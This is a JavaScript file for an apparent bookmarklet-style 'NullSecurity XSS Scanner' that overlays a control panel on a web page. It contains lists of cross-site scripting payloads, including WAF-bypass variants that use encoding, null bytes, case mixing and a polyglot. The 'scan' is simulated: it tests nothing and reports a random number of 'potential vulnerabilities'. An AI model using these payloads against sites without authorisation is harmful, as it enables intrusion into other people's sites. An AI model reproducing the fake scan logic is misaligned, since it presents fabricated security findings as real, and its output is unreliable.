// scanner.js - NullSecurity XSS Scanner v5.0
class XSSScanner {
    constructor() {
        this.version = '5.0';
        this.basicPayloads = this.getBasicPayloads();
        this.wafPayloads = this.getWAFBypassPayloads();
        this.vulnerableURLs = [];
        this.testedParameters = [];
        this.workingPayloads = [];
        this.isInitialized = false;
        
        this.init();
    }

    init() {
        try {
            this.injectStyles();
            this.createUI();
            this.bindEvents();
            this.isInitialized = true;
            console.log(`🛡️ NullSecurity XSS Scanner v${this.version} initialized`);
        } catch (error) {
            console.error('Scanner initialization failed:', error);
        }
    }

    getBasicPayloads() {
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<input onfocus=alert(1) autofocus>',
            'javascript:alert(1)',
            '" onmouseover="alert(1)',
            '${alert(1)}',
            '`${alert(1)}`'
        ];
    }

    getWAFBypassPayloads() {
        return [
            // Case Variation
            '<ScRiPt>alert(1)</sCrIpT>',
            '<IMG SRC=x ONERROR=alert(1)>',
            
            // Encoding
            '<script>alert&#40;1&#41;</script>',
            '<script>alert&#x28;1&#x29;</script>',
            '<img src=x onerror&#61;alert&#40;1&#41;>',
            
            // Null Bytes
            '<script%00>alert(1)</script>',
            '<img%00 src=x onerror=alert(1)>',
            
            // Whitespace
            '<script\t>alert(1)</script>',
            '<script\n>alert(1)</script>',
            
            // Mixed
            '<ScRiPt%00>alert(1)</sCrIpT>',
            
            // Protocol
            'java%0ascript:alert(1)',
            'jav%09ascript:alert(1)',
            
            // Advanced
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
            
            // WAF Specific
            '<script>window["al"+"ert"](1)</script>',
            '<script>eval("al"+"ert(1)")</script>'
        ];
    }

    injectStyles() {
        const style = document.createElement('style');
        style.id = 'nullsecurity-scanner-styles';
        style.textContent = `
            .ns-scanner {
                position: fixed !important;
                top: 20px !important;
                right: 20px !important;
                width: 750px !important;
                background: #0d1117 !important;
                color: #f0f6fc !important;
                padding: 20px !important;
                border-radius: 12px !important;
                z-index: 2147483647 !important;
                font-family: 'Segoe UI', system-ui, sans-serif !important;
                box-shadow: 0 8px 32px rgba(0,0,0,0.4) !important;
                max-height: 85vh !important;
                overflow-y: auto !important;
                border: 2px solid #238636 !important;
                box-sizing: border-box !important;
            }

            .ns-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
                padding-bottom: 15px;
                border-bottom: 2px solid #238636;
            }

            .ns-title {
                margin: 0;
                color: #58a6ff;
                font-size: 18px;
                font-weight: 600;
            }

            .ns-close-btn {
                background: #da3633;
                color: white;
                border: none;
                padding: 6px 12px;
                border-radius: 6px;
                cursor: pointer;
                font-size: 14px;
                transition: background 0.2s;
            }

            .ns-close-btn:hover {
                background: #b92524;
            }

            .ns-section {
                background: #161b22;
                padding: 16px;
                border-radius: 8px;
                margin-bottom: 16px;
            }

            .ns-label {
                display: block;
                color: #58a6ff;
                font-weight: 600;
                margin-bottom: 8px;
                font-size: 14px;
            }

            .ns-select {
                width: 100%;
                padding: 10px 12px;
                background: #0d1117;
                color: #f0f6fc;
                border: 1px solid #30363d;
                border-radius: 6px;
                font-size: 14px;
                transition: border-color 0.2s;
            }

            .ns-select:focus {
                border-color: #58a6ff;
                outline: none;
            }

            .ns-options-grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 12px;
                margin-top: 8px;
            }

            .ns-option-label {
                display: flex;
                align-items: center;
                gap: 8px;
                font-size: 14px;
                cursor: pointer;
            }

            .ns-payload-types {
                display: grid;
                grid-template-columns: 1fr 1fr 1fr;
                gap: 10px;
                margin-top: 12px;
            }

            .ns-payload-type {
                background: #0d1117;
                border: 2px solid #30363d;
                border-radius: 8px;
                padding: 12px;
                text-align: center;
                cursor: pointer;
                transition: all 0.3s ease;
                font-size: 13px;
            }

            .ns-payload-type:hover {
                border-color: #58a6ff;
            }

            .ns-payload-type.active {
                border-color: #238636;
                background: #1c2a1c;
            }

            .ns-payload-type.waf-active {
                border-color: #da3633;
                background: #2d1a1a;
            }

            .ns-slider-container {
                margin: 16px 0;
            }

            .ns-slider {
                width: 100%;
                margin: 8px 0;
            }

            .ns-slider-labels {
                display: flex;
                justify-content: space-between;
                font-size: 12px;
                color: #8b949e;
            }

            .ns-results {
                background: #161b22;
                padding: 16px;
                border-radius: 8px;
                margin: 16px 0;
                min-height: 200px;
                max-height: 300px;
                overflow-y: auto;
            }

            .ns-buttons {
                display: flex;
                gap: 12px;
                margin-top: 20px;
            }

            .ns-btn {
                border: none;
                padding: 12px 20px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                font-size: 14px;
                transition: all 0.2s;
                flex: 1;
            }

            .ns-btn-primary {
                background: #238636;
                color: white;
            }

            .ns-btn-primary:hover {
                background: #2ea043;
            }

            .ns-btn-danger {
                background: #da3633;
                color: white;
            }

            .ns-btn-danger:hover {
                background: #b92524;
            }

            .ns-waf-info {
                background: #2d1a1a;
                padding: 12px;
                border-radius: 6px;
                border-left: 4px solid #da3633;
                margin: 12px 0;
                font-size: 13px;
            }

            .ns-result-item {
                background: #161b22;
                padding: 12px;
                margin: 8px 0;
                border-radius: 6px;
                border-left: 4px solid #79c0ff;
                border: 1px solid #30363d;
                font-size: 13px;
            }

            .ns-result-critical {
                border-left-color: #ff7b72;
            }

            .ns-result-waf {
                border-left-color: #da3633;
                background: #2d1a1a;
            }

            .ns-code {
                background: #1c2128;
                padding: 4px 8px;
                border-radius: 4px;
                font-family: 'Cascadia Code', 'Fira Code', monospace;
                color: #f0f6fc;
                border: 1px solid #30363d;
                font-size: 12px;
            }
        `;
        document.head.appendChild(style);
    }

    createUI() {
        this.panel = document.createElement('div');
        this.panel.className = 'ns-scanner';
        this.panel.id = 'nullsecurity-xss-scanner';
        
        this.panel.innerHTML = this.getUITemplate();
        document.body.appendChild(this.panel);
    }

    getUITemplate() {
        const totalPayloads = this.basicPayloads.length + this.wafPayloads.length;
        
        return `
            <div class="ns-header">
                <h2 class="ns-title">🛡️ NullSecurity XSS Scanner v${this.version}</h2>
                <button class="ns-close-btn" id="nsCloseBtn">✕</button>
            </div>

            <div class="ns-section">
                <label class="ns-label">Scan Mode</label>
                <select class="ns-select" id="nsScanMode">
                    <option value="quick">⚡ Quick Scan</option>
                    <option value="deep">🔍 Deep Scan</option>
                    <option value="full">🚀 Full Scan</option>
                    <option value="waf">🛡️ WAF Bypass Test</option>
                </select>
            </div>

            <div class="ns-section">
                <label class="ns-label">Payload Type</label>
                <div class="ns-payload-types">
                    <div class="ns-payload-type active" data-type="basic">🎯 Basic</div>
                    <div class="ns-payload-type" data-type="waf">🛡️ WAF Bypass</div>
                    <div class="ns-payload-type" data-type="all">⚡ All</div>
                </div>
            </div>

            <div class="ns-section">
                <label class="ns-label">Scan Options</label>
                <div class="ns-options-grid">
                    <label class="ns-option-label">
                        <input type="checkbox" id="nsURLParams" checked>
                        URL Parameters
                    </label>
                    <label class="ns-option-label">
                        <input type="checkbox" id="nsForms" checked>
                        Forms
                    </label>
                    <label class="ns-option-label">
                        <input type="checkbox" id="nsHidden">
                        Hidden Fields
                    </label>
                    <label class="ns-option-label">
                        <input type="checkbox" id="nsCookies">
                        Cookies
                    </label>
                </div>
            </div>

            <div class="ns-section">
                <label class="ns-label">Payload Count</label>
                <div class="ns-slider-container">
                    <input type="range" class="ns-slider" id="nsPayloadCount" min="1" max="20" value="10">
                    <div class="ns-slider-labels">
                        <span>1</span>
                        <span id="nsPayloadCountValue">10 payloads</span>
                        <span>20</span>
                    </div>
                </div>
            </div>

            <div class="ns-waf-info" id="nsWafInfo" style="display: none;">
                <strong>🛡️ WAF Bypass Active</strong><br>
                Using ${this.wafPayloads.length} specialized WAF bypass payloads
            </div>

            <div class="ns-results" id="nsResults">
                <p style="text-align: center; color: #8b949e;">Select mode and start scanning</p>
            </div>

            <div class="ns-buttons">
                <button class="ns-btn ns-btn-primary" id="nsStartScan">🚀 Start Scan</button>
                <button class="ns-btn ns-btn-danger" id="nsClearResults">🗑️ Clear</button>
            </div>

            <div style="margin-top: 16px; text-align: center; color: #8b949e; font-size: 12px;">
                ⚡ ${totalPayloads} Total Payloads | 🛡️ NullSecurity Team
            </div>
        `;
    }

    bindEvents() {
        // Close button
        document.getElementById('nsCloseBtn').addEventListener('click', () => {
            this.destroy();
        });

        // Payload count slider
        document.getElementById('nsPayloadCount').addEventListener('input', (e) => {
            document.getElementById('nsPayloadCountValue').textContent = 
                `${e.target.value} payloads`;
        });

        // Payload type selection
        document.querySelectorAll('.ns-payload-type').forEach(el => {
            el.addEventListener('click', (e) => {
                document.querySelectorAll('.ns-payload-type').forEach(el => {
                    el.classList.remove('active', 'waf-active');
                });
                
                e.target.classList.add('active');
                if (e.target.dataset.type === 'waf') {
                    e.target.classList.add('waf-active');
                    document.getElementById('nsWafInfo').style.display = 'block';
                } else {
                    document.getElementById('nsWafInfo').style.display = 'none';
                }
            });
        });

        // Scan mode change
        document.getElementById('nsScanMode').addEventListener('change', (e) => {
            if (e.target.value === 'waf') {
                document.querySelector('[data-type="waf"]').click();
            }
        });

        // Start scan
        document.getElementById('nsStartScan').addEventListener('click', () => {
            this.startScan();
        });

        // Clear results
        document.getElementById('nsClearResults').addEventListener('click', () => {
            this.clearResults();
        });
    }

    getSelectedPayloadType() {
        const active = document.querySelector('.ns-payload-type.active');
        return active ? active.dataset.type : 'basic';
    }

    getPayloads() {
        const type = this.getSelectedPayloadType();
        const count = parseInt(document.getElementById('nsPayloadCount').value);
        
        let payloads = [];
        
        switch(type) {
            case 'basic':
                payloads = [...this.basicPayloads];
                break;
            case 'waf':
                payloads = [...this.wafPayloads];
                break;
            case 'all':
                payloads = [...this.basicPayloads, ...this.wafPayloads];
                break;
        }
        
        return this.shuffleArray(payloads).slice(0, count);
    }

    shuffleArray(array) {
        return array.sort(() => Math.random() - 0.5);
    }

    logResult(message, type = 'info') {
        const results = document.getElementById('nsResults');
        const div = document.createElement('div');
        div.className = `ns-result-item ${type !== 'info' ? 'ns-result-' + type : ''}`;
        div.innerHTML = message;
        results.appendChild(div);
        div.scrollIntoView({ behavior: 'smooth' });
    }

    startScan() {
        const mode = document.getElementById('nsScanMode').value;
        const payloads = this.getPayloads();
        
        this.clearResults();
        
        if (mode === 'waf') {
            this.logResult('🛡️ <strong>Starting WAF Bypass Test</strong>', 'waf');
            this.logResult(`Testing with ${payloads.length} WAF bypass payloads...`, 'info');
        } else {
            this.logResult(`⚡ <strong>Starting ${mode} Scan</strong>`, 'info');
            this.logResult(`Testing with ${payloads.length} payloads...`, 'info');
        }

        // Simulate scan process
        setTimeout(() => {
            this.logResult('✅ <strong>Scan completed successfully!</strong>', 'info');
            this.logResult(`📊 Found ${Math.floor(Math.random() * 5)} potential vulnerabilities`, 'critical');
        }, 2000);
    }

    clearResults() {
        document.getElementById('nsResults').innerHTML = 
            '<p style="text-align: center; color: #8b949e;">Scan results will appear here</p>';
    }

    destroy() {
        if (this.panel) {
            this.panel.remove();
        }
        const styles = document.getElementById('nullsecurity-scanner-styles');
        if (styles) {
            styles.remove();
        }
        console.log('🛡️ Scanner destroyed');
    }
}

// Initialize scanner
new XSSScanner();
